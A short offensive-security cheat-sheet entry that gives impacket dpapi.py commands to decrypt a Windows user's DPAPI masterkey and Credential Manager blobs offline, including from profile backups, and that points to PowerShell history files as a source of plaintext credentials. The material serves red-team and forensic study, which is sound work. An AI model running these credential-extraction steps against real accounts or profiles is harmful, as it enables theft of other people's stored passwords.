# DPAPI Credential Manager Decrypt

Any Windows Credential Manager entry saved by a user can be decrypted offline with that user's own domain password — no admin needed, works from exported profile backups too (WIM, roaming profile copies on a share):

```bash
# both live under %APPDATA%\Microsoft, pull the masterkey and the credential blob
# masterkey path: AppData/Roaming/Microsoft/Protect/<user-SID>/<masterkey-GUID>
# cred blob path: AppData/Roaming/Microsoft/Credentials/<blob-filename>

dpapi.py masterkey -file <masterkey-GUID-file> -sid <user-SID> -password '<user-domain-password>'
dpapi.py credential -file <credential-blob-file> -key <decrypted-masterkey-from-above>
```
Also check `ConsoleHost_history.txt` in the same profile — credentials entered once via `Enter-PSCredential`/plaintext params often sit there too, and it's a quicker win than decrypting DPAPI if both are present.
